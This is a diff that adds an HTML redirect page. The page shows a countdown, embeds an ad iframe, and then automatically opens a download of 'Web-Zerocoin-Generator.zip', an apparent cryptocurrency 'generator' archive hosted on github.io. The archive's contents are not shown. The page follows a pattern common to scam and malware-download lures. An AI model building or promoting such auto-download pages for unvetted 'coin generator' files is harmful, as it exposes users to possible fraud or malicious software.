@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 100px;
+        }
+        #countdown {
+            font-size: 24px;
+            color: #333;
+        }
+        #link {
+            font-size: 18px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Redirecting...</h1>
+    <div id="countdown">Redirecting in 10 seconds...</div>
+    <div id="link">The link will open in a new tab: <a href="https://anrei1982i.github.io/Web-Zerocoin-Generator/files/Web-Zerocoin-Generator.zip" target="_blank" id="redirectLink">Web-Zerocoin-Generator.zip</a></div>
+<center><iframe src="https://zerads.com/ad/ad.php?width=300&ref=9822" marginwidth="0" marginheight="0" width="300" height="250" scrolling="no" border="0" frameborder="0"></iframe></center>
+    <script>
+        let countdown = 10;
+        const countdownElement = document.getElementById('countdown');
+        const linkElement = document.getElementById('redirectLink');
+        const url = 'https://anrei1982i.github.io/Web-Zerocoin-Generator/files/Web-Zerocoin-Generator.zip'; // Replace with your desired URL
+
+        const timer = setInterval(() => {
+            countdown--;
+            countdownElement.textContent = `Redirecting in ${countdown} seconds...`;
+            
+            if (countdown <= 0) {
+                clearInterval(timer);
+                // Open the link in a new tab
+                window.open(url, '_blank');
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
